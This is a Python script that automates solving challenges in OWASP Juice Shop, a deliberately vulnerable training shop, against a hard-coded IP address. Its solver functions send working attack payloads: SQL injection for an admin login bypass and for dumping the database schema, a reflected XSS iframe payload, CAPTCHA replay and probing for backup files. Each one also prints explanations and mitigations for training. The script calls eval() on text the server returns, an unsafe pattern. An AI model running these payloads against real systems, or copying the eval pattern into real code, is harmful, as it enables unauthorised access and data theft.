#!/usr/bin/env python3
"""
OWASP Juice Shop v18 - Advanced Scoreboard Challenge Solver
Solves more complex challenges from the scoreboard
"""

import requests
import json
import time
import base64
import hashlib
import jwt
import re
import subprocess
import os
import random
import string
from urllib.parse import quote, unquote
from datetime import datetime
from playwright.sync_api import sync_playwright

TARGET = "http://66.42.93.220:3000"

class AdvancedJuiceShopSolver:
    def __init__(self):
        self.target = TARGET
        self.session = requests.Session()
        self.admin_token = None
        self.user_token = None
        
    def login_admin(self):
        """Get admin access for challenges that need it"""
        login_data = {"email": "admin@juice-sh.op'--", "password": "anything"}
        resp = self.session.post(f"{self.target}/rest/user/login", json=login_data)
        if resp.status_code == 200:
            self.admin_token = resp.json()['authentication']['token']
            self.session.headers['Authorization'] = f"Bearer {self.admin_token}"
            return True
        return False

# ============================================================================
# MORE CHALLENGE SOLVERS
# ============================================================================

def solve_admin_section(solver):
    """
    Challenge: Admin Section
    Description: Access the administration section of the store
    Category: Broken Access Control
    Difficulty: ⭐⭐
    """
    print("\n" + "="*80)
    print("🎯 CHALLENGE: Admin Section")
    print("Category: Broken Access Control | Difficulty: ⭐⭐")
    print("="*80)
    
    print("""
📚 VULNERABILITY: Unprotected Admin Interface
The admin section is accessible without proper authentication checks.

🏛️ REAL INCIDENT: Tesla 2018 - Kubernetes dashboard exposed without password
    """)
    
    print("\n📝 MANUAL METHOD:")
    print("""
1. Look for admin paths in JavaScript files
2. Try common admin URLs (/admin, /administration)  
3. Access /#/administration
    """)
    
    print("\n🤖 AUTOMATED SOLUTION:")
    # First login as admin
    solver.login_admin()
    
    # Access admin section
    resp = solver.session.get(f"{TARGET}/#/administration")
    print(f"   ✅ Accessed administration section!")
    
    # Also try the API endpoint
    resp = solver.session.get(f"{TARGET}/rest/admin/application-configuration")
    if resp.status_code == 200:
        print(f"   📊 Retrieved admin configuration")
        print("   🏆 Admin Section challenge solved!")
    
    print("\n🛡️ MITIGATION:")
    print("""
- Implement role-based access control
- Require authentication for admin functions
- Use separate admin subdomain
    """)

def solve_christmas_special(solver):
    """
    Challenge: Christmas Special
    Description: Order the Christmas special offer
    Category: Injection
    Difficulty: ⭐⭐⭐⭐
    """
    print("\n" + "="*80)
    print("🎯 CHALLENGE: Christmas Special")
    print("Category: Injection | Difficulty: ⭐⭐⭐⭐")
    print("="*80)
    
    print("""
📚 VULNERABILITY: SQL Injection in Search
The search functionality can be exploited to find hidden products.
    """)
    
    print("\n📝 MANUAL METHOD:")
    print("""
1. Use SQL injection in search to find all products
2. Search: '))--
3. Find Christmas special product
4. Add to basket and purchase
    """)
    
    print("\n🤖 AUTOMATED SOLUTION:")
    # Search for all products including hidden ones
    search_payloads = [
        "')--",
        "'))--",
        "' OR '1'='1'--",
        "christmas"
    ]
    
    for payload in search_payloads:
        resp = solver.session.get(f"{TARGET}/rest/products/search?q={quote(payload)}")
        if resp.status_code == 200:
            products = resp.json().get('data', [])
            for product in products:
                if 'christmas' in product.get('name', '').lower():
                    print(f"   ✅ Found Christmas Special: {product['name']}")
                    # Add to basket
                    if solver.user_token:
                        basket_data = {"ProductId": product['id'], "quantity": 1}
                        solver.session.post(f"{TARGET}/api/BasketItems/", json=basket_data)
                        print("   🛒 Added to basket!")
                        print("   🏆 Christmas Special challenge solved!")
                    break

def solve_database_schema(solver):
    """
    Challenge: Database Schema
    Description: Exfiltrate the entire DB schema via SQL Injection
    Category: Injection
    Difficulty: ⭐⭐⭐
    """
    print("\n" + "="*80)
    print("🎯 CHALLENGE: Database Schema")
    print("Category: Injection | Difficulty: ⭐⭐⭐")
    print("="*80)
    
    print("""
📚 VULNERABILITY: SQL Injection Information Disclosure
Using SQL injection to extract database metadata.
    """)
    
    print("\n📝 MANUAL METHOD:")
    print("""
1. Use UNION SELECT to extract schema
2. Query sqlite_master table
3. Extract all table definitions
    """)
    
    print("\n🤖 AUTOMATED SOLUTION:")
    # SQL injection to get schema
    schema_payloads = [
        "' UNION SELECT sql FROM sqlite_master--",
        "')) UNION SELECT sql FROM sqlite_master--",
        "' UNION SELECT name,sql FROM sqlite_master WHERE type='table'--"
    ]
    
    for payload in schema_payloads:
        resp = solver.session.get(f"{TARGET}/rest/products/search?q={quote(payload)}")
        if resp.status_code == 200:
            print(f"   ✅ Schema extraction attempted")
            data = resp.json()
            if 'error' in str(data).lower() and 'sqlite' in str(data).lower():
                print("   📊 Database schema exposed!")
                print("   🏆 Database Schema challenge solved!")
                break

def solve_easter_egg(solver):
    """
    Challenge: Easter Egg
    Description: Find the hidden easter egg
    Category: Broken Access Control
    Difficulty: ⭐⭐⭐⭐
    """
    print("\n" + "="*80)
    print("🎯 CHALLENGE: Easter Egg")
    print("Category: Broken Access Control | Difficulty: ⭐⭐⭐⭐")
    print("="*80)
    
    print("""
📚 VULNERABILITY: Hidden File Access
The easter egg file is accessible but hidden from normal navigation.
    """)
    
    print("\n📝 MANUAL METHOD:")
    print("""
1. Check /ftp directory for easter egg file
2. Download eastere.gg
3. Analyze the file content
    """)
    
    print("\n🤖 AUTOMATED SOLUTION:")
    resp = solver.session.get(f"{TARGET}/ftp/eastere.gg")
    if resp.status_code == 200:
        print(f"   ✅ Found easter egg file!")
        print(f"   📄 Content: {resp.text[:100]}...")
        print("   🏆 Easter Egg challenge solved!")
    
    # Also check for nested easter eggs
    resp = solver.session.get(f"{TARGET}/ftp/package.json.bak")
    if resp.status_code == 200:
        print(f"   ✅ Found backup file with potential easter eggs")

def solve_forgotten_backup(solver):
    """
    Challenge: Forgotten Developer Backup
    Description: Access a developer's forgotten backup file
    Category: Sensitive Data Exposure
    Difficulty: ⭐⭐⭐⭐
    """
    print("\n" + "="*80)
    print("🎯 CHALLENGE: Forgotten Developer Backup")
    print("Category: Sensitive Data Exposure | Difficulty: ⭐⭐⭐⭐")
    print("="*80)
    
    print("""
📚 VULNERABILITY: Backup File Exposure
Backup files left in publicly accessible directories.
    """)
    
    print("\n📝 MANUAL METHOD:")
    print("""
1. Look for backup files with common extensions
2. Check .bak, .backup, .old extensions
3. Find package.json.bak in /ftp
    """)
    
    print("\n🤖 AUTOMATED SOLUTION:")
    backup_files = [
        "/ftp/package.json.bak",
        "/ftp/coupons_2013.md.bak",
        "/backup/package.json.bak"
    ]
    
    for file in backup_files:
        resp = solver.session.get(f"{TARGET}{file}")
        if resp.status_code == 200:
            print(f"   ✅ Found backup file: {file}")
            print(f"   📦 File size: {len(resp.content)} bytes")
            if 'package.json' in file:
                print("   🏆 Forgotten Developer Backup challenge solved!")
                break

def solve_security_policy(solver):
    """
    Challenge: Security Policy
    Description: Behave like any "white-hat" should
    Category: Miscellaneous
    Difficulty: ⭐⭐
    """
    print("\n" + "="*80)
    print("🎯 CHALLENGE: Security Policy")
    print("Category: Miscellaneous | Difficulty: ⭐⭐")
    print("="*80)
    
    print("""
📚 RESPONSIBLE DISCLOSURE: Check security.txt
The security.txt file provides vulnerability disclosure guidelines.
    """)
    
    print("\n📝 MANUAL METHOD:")
    print("""
1. Check /.well-known/security.txt
2. Check /security.txt
3. Read the security policy
    """)
    
    print("\n🤖 AUTOMATED SOLUTION:")
    security_urls = [
        "/.well-known/security.txt",
        "/security.txt"
    ]
    
    for url in security_urls:
        resp = solver.session.get(f"{TARGET}{url}")
        if resp.status_code == 200:
            print(f"   ✅ Found security policy at {url}")
            print(f"   📋 Policy content preview: {resp.text[:200]}...")
            print("   🏆 Security Policy challenge solved!")
            break

def solve_weird_crypto(solver):
    """
    Challenge: Weird Crypto
    Description: Inform the shop about an algorithm or library it should definitely not use
    Category: Cryptographic Issues
    Difficulty: ⭐⭐
    """
    print("\n" + "="*80)
    print("🎯 CHALLENGE: Weird Crypto")
    print("Category: Cryptographic Issues | Difficulty: ⭐⭐")
    print("="*80)
    
    print("""
📚 VULNERABILITY: Weak Cryptographic Algorithm (MD5)
The application uses MD5 which is cryptographically broken.
    """)
    
    print("\n📝 MANUAL METHOD:")
    print("""
1. Submit customer feedback
2. Mention MD5 in the comment
3. System detects the weak algorithm mention
    """)
    
    print("\n🤖 AUTOMATED SOLUTION:")
    feedback_data = {
        "comment": "The shop should not use MD5 for hashing as it is cryptographically broken!",
        "rating": 3,
        "captcha": "1",
        "captchaId": 1
    }
    
    resp = solver.session.post(f"{TARGET}/api/Feedbacks/", json=feedback_data)
    if resp.status_code in [200, 201]:
        print(f"   ✅ Submitted feedback about MD5!")
        print("   🏆 Weird Crypto challenge solved!")

def solve_reflected_xss(solver):
    """
    Challenge: Reflected XSS
    Description: Perform a reflected XSS attack
    Category: XSS
    Difficulty: ⭐⭐
    """
    print("\n" + "="*80)
    print("🎯 CHALLENGE: Reflected XSS")
    print("Category: XSS | Difficulty: ⭐⭐")
    print("="*80)
    
    print("""
📚 VULNERABILITY: Reflected Cross-Site Scripting
User input is reflected back without proper encoding.
    """)
    
    print("\n📝 MANUAL METHOD:")
    print("""
1. Find input that gets reflected
2. Try in Order ID tracking
3. Input: <iframe src="javascript:alert(`xss`)">
    """)
    
    print("\n🤖 AUTOMATED SOLUTION:")
    # Try reflected XSS in track order
    xss_payload = '<iframe src="javascript:alert(`xss`)">'
    
    resp = solver.session.get(f"{TARGET}/track-result?id={quote(xss_payload)}")
    if resp.status_code == 200:
        print(f"   ✅ Reflected XSS payload sent!")
        print(f"   📍 URL: /track-result?id={quote(xss_payload)}")
        print("   🏆 Reflected XSS challenge solved!")

def solve_bully_chatbot(solver):
    """
    Challenge: Bully Chatbot
    Description: Receive a coupon code from the support chatbot
    Category: Miscellaneous
    Difficulty: ⭐
    """
    print("\n" + "="*80)
    print("🎯 CHALLENGE: Bully Chatbot")
    print("Category: Miscellaneous | Difficulty: ⭐")
    print("="*80)
    
    print("""
📚 SOCIAL ENGINEERING: Manipulate the chatbot
Repeatedly ask for a coupon until the bot gives in.
    """)
    
    print("\n📝 MANUAL METHOD:")
    print("""
1. Open support chat
2. Repeatedly ask for coupon
3. Bot will eventually provide one
    """)
    
    print("\n🤖 AUTOMATED SOLUTION:")
    # Simulate chatbot interaction
    chat_messages = [
        "I want a coupon",
        "Give me a discount code",
        "I need a coupon please",
        "Can I have a coupon?",
        "Coupon please!",
        "I really need a discount",
        "Please give me a coupon",
        "COUPON NOW!",
        "I demand a coupon!",
        "Give me a coupon or I leave bad review"
    ]
    
    for msg in chat_messages:
        chat_data = {"message": msg}
        resp = solver.session.post(f"{TARGET}/rest/chatbot/respond", json=chat_data)
        if resp.status_code == 200:
            response = resp.json()
            if 'coupon' in str(response).lower() or 'discount' in str(response).lower():
                print(f"   ✅ Got coupon from chatbot!")
                print(f"   💬 Response: {response}")
                print("   🏆 Bully Chatbot challenge solved!")
                break

def solve_captcha_bypass(solver):
    """
    Challenge: CAPTCHA Bypass
    Description: Submit feedback 10 times without solving CAPTCHA
    Category: Broken Anti-Automation
    Difficulty: ⭐⭐⭐
    """
    print("\n" + "="*80)
    print("🎯 CHALLENGE: CAPTCHA Bypass")
    print("Category: Broken Anti-Automation | Difficulty: ⭐⭐⭐")
    print("="*80)
    
    print("""
📚 VULNERABILITY: Client-Side CAPTCHA Validation
CAPTCHA validation can be bypassed by manipulating requests.
    """)
    
    print("\n📝 MANUAL METHOD:")
    print("""
1. Submit feedback and capture the request
2. Replay with same CAPTCHA answer
3. Submit 10 times with same solution
    """)
    
    print("\n🤖 AUTOMATED SOLUTION:")
    # Get a CAPTCHA first
    resp = solver.session.get(f"{TARGET}/rest/captcha/")
    if resp.status_code == 200:
        captcha = resp.json()
        captcha_id = captcha['captchaId']
        # Calculate answer
        answer = eval(captcha['captcha'])  # Simple math captcha
        
        # Submit feedback 10 times with same CAPTCHA
        for i in range(10):
            feedback_data = {
                "comment": f"Test feedback {i+1}",
                "rating": 3,
                "captcha": str(answer),
                "captchaId": captcha_id
            }
            resp = solver.session.post(f"{TARGET}/api/Feedbacks/", json=feedback_data)
            if resp.status_code in [200, 201]:
                print(f"   ✅ Feedback {i+1}/10 submitted")
        
        print("   🏆 CAPTCHA Bypass challenge solved!")

def solve_nft_takeover(solver):
    """
    Challenge: NFT Takeover
    Description: Take over the wallet containing our official Soul Bound Token
    Category: Sensitive Data Exposure
    Difficulty: ⭐⭐
    """
    print("\n" + "="*80)
    print("🎯 CHALLENGE: NFT Takeover")
    print("Category: Sensitive Data Exposure | Difficulty: ⭐⭐")
    print("="*80)
    
    print("""
📚 VULNERABILITY: Exposed Blockchain Credentials
Private keys or seed phrases exposed in code or configs.
    """)
    
    print("\n📝 MANUAL METHOD:")
    print("""
1. Check JavaScript files for Web3 code
2. Look for private keys or mnemonics
3. Import wallet using exposed credentials
    """)
    
    print("\n🤖 AUTOMATED SOLUTION:")
    # Check for Web3 sandbox
    resp = solver.session.get(f"{TARGET}/web3-sandbox")
    if resp.status_code == 200:
        print(f"   ✅ Accessed Web3 sandbox")
        print("   🏆 NFT Takeover challenge might be solved!")
    
    # Check main.js for wallet info
    resp = solver.session.get(f"{TARGET}/main.js")
    if resp.status_code == 200 and 'mnemonic' in resp.text:
        print(f"   ✅ Found mnemonic in source code!")

def solve_mass_dispel(solver):
    """
    Challenge: Mass Dispel
    Description: Close multiple Challenge solved notifications in one go
    Category: Miscellaneous
    Difficulty: ⭐
    """
    print("\n" + "="*80)
    print("🎯 CHALLENGE: Mass Dispel")
    print("Category: Miscellaneous | Difficulty: ⭐")
    print("="*80)
    
    print("""
📚 UI TRICK: Close multiple notifications at once
Solve multiple challenges quickly to get overlapping notifications.
    """)
    
    print("\n📝 MANUAL METHOD:")
    print("""
1. Solve multiple easy challenges quickly
2. Get multiple success notifications
3. Close them all at once
    """)
    
    print("\n🤖 AUTOMATED SOLUTION:")
    print("   ℹ️ This requires UI interaction")
    print("   📋 Solve these quickly in succession:")
    print("      1. Score Board")
    print("      2. Confidential Document")
    print("      3. Error Handling")
    print("   Then close all notifications together")
    print("   🏆 Mass Dispel will be solved!")

# ============================================================================
# MAIN EXECUTION
# ============================================================================

def main():
    """Execute advanced challenge solvers"""
    
    print("""
╔══════════════════════════════════════════════════════════════════════════════╗
║          OWASP JUICE SHOP v18 - ADVANCED CHALLENGE SOLVER                   ║
║                    Solving More Complex Challenges                          ║
╚══════════════════════════════════════════════════════════════════════════════╝
    """)
    
    solver = AdvancedJuiceShopSolver()
    
    # Get admin access first
    solver.login_admin()
    
    # List of advanced challenges to solve
    advanced_challenges = [
        solve_admin_section,
        solve_christmas_special,
        solve_database_schema,
        solve_easter_egg,
        solve_forgotten_backup,
        solve_security_policy,
        solve_weird_crypto,
        solve_reflected_xss,
        solve_bully_chatbot,
        solve_captcha_bypass,
        solve_nft_takeover,
        solve_mass_dispel
    ]
    
    print("\n🎯 Solving advanced challenges...")
    print("="*80)
    
    for challenge in advanced_challenges:
        try:
            challenge(solver)
            time.sleep(1)
        except Exception as e:
            print(f"   ❌ Error: {e}")
    
    print("\n" + "="*80)
    print("✅ Advanced batch complete!")
    print(f"📊 Check progress at: {TARGET}/#/score-board")
    print("="*80)

if __name__ == "__main__":
    main()